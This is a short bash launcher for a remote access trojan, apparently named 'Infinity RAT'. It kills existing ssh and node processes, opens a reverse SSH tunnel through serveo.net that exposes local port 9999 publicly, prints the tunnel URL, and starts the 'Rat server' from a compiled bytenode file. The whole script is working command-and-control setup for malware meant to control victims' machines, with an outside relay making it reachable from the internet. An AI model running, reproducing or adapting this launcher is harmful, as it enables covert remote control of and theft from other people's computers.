#!/bin/bash
cwd=`pwd`
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
RESET="\033[0m"
clear
ssh=$(ps aux | grep -o "ssh" | head -n1)
node=$(ps aux | grep -o "node" | head -n1)
if [[ $ssh == *'ssh'* ]]; then
	killall -2 ssh > /dev/null 2>&1
fi
if [[ $node == *'node'* ]]; then
	killall -2 node >/dev/null 2>&1
fi
echo -e "${RED} ___ _   _ _____ ___ _   _ ___ _______   __  ${GREEN}____      _  _____
${RED}|_ _| \ | |  ___|_ _| \ | |_ _|_   _\ \ / / ${GREEN}|  _ \    / \|_   _|
${RED} | ||  \| | |_   | ||  \| || |  | |  \ V /  ${GREEN}| |_) |  / _ \ | |
${RED} | || |\  |  _|  | || |\  || |  | |   | |   ${GREEN}|  _ <  / ___ \| |
${RED}|___|_| \_|_|   |___|_| \_|___| |_|   |_|   ${GREEN}|_| \_\/_/   \_\_|${RESET}\n"
ssh -R 80:localhost:9999 serveo.net> http.txt 2>&1 &
ssh_pid=$!
echo -e "${GREEN}\n Starting ssh server...\n${RESET}"
sleep 5
http=$(grep -a 'https://[0-9a-z]*\.serveo.net' http.txt)
echo -e "${http}\n"
echo -e "${GREEN}\n Starting Rat server...\n${RESET}"
bytenode index.jsc
kill $ssh_pid